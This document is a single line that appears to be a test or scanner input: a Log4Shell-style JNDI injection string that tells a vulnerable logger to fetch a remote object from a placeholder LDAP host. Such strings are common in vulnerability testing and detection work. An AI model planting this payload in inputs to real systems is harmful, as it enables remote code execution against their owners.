${jndi:ldap://test.tld/a}